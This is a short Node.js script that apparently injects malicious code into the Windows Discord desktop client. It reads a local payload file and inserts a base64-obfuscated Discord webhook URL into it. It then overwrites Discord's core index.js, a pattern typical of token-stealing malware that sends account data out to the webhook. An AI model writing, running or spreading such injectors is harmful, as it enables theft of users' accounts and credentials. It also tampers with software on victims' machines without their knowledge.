(function() {

    const fs = require('fs'),
    w = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODYzNzY0Mjc1MzE5NjY4NzY3L043OG5oRWYzWmNTZkFYT3kwdVBzWkI3akx3RVRGVXotUk5tcnBpSmZ4MlBhZFpfamFma3R0QXJwRmRQcXd4c09DQTBD'

    let s = fs.readFileSync('./hey.js')

    let p = `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Discord/app-1.0.9002/modules/discord_desktop_core-3/discord_desktop_core/index.js`
    if(!p) return;
    a = fs.readFileSync(p, 'utf8')

    console.log(a.split(';'))

    if(!a.split(';').includes('\'tanka\'' || ' \'tanka\'')) {

        console.log('injected!')
        
        fs.writeFileSync(p, s.toString().replace(/'hey'/g, `'${w}'`), 'utf8')

    } else return console.log('no injected!')

})()